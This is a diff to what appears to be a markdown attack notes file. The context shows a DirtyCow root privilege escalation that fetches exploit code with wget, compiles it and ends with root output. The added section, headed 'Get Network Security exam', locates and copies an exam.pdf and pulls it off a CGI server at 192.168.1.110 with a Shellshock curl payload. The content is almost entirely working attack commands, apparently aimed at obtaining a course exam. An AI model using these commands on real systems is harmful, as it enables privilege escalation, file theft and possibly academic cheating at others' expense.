@@ -34,7 +34,7 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-Exploit dirtycow:
+DirtyCow root privilege escalation:
 ```
 cd /tmp
 wget <url>/c0w.c --no-check-certificate
@@ -46,4 +46,15 @@ gcc -pthread c0w.c -o c0w
 /usr/bin/passwd
 id
 uid=0(root) gid=0(root) groups=0(root)
+```
+
+Get Network Security exam:
+```
+find / -name "exam.pdf"
+
+cp /home/netsec/exam.pdf /tmp/exam.pdf
+
+exit
+
+curl -H "User-Agent: () { :; }; echo \"Content-Type: application/pdf\"; echo \"\"; echo \"\"; /bin/cat /tmp/exam.pdf" 192.168.1.110/cgi-bin/index.cgi > exam.pdf
 ```
